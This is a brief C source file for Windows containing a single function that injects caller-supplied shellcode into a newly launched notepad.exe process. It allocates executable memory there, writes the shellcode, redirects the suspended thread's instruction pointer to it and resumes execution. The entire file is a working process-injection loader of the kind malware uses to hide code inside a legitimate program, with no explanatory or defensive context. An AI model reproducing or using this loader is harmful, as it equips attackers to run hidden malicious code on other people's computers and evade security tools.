#include <Windows.h>

int LoadByModifyThreadCtx(unsigned char *shellcode,int size) {
    STARTUPINFO si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };
    TCHAR ProcessName[] = ("notepad.exe");
    CreateProcess(NULL, ProcessName, NULL, NULL, FALSE,  0, NULL, NULL, &si, &pi);
    SuspendThread(pi.hThread);
    LPVOID lpBaseAddress = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, lpBaseAddress, shellcode, size, NULL);
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rip = (DWORD64)lpBaseAddress;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    return 0;
}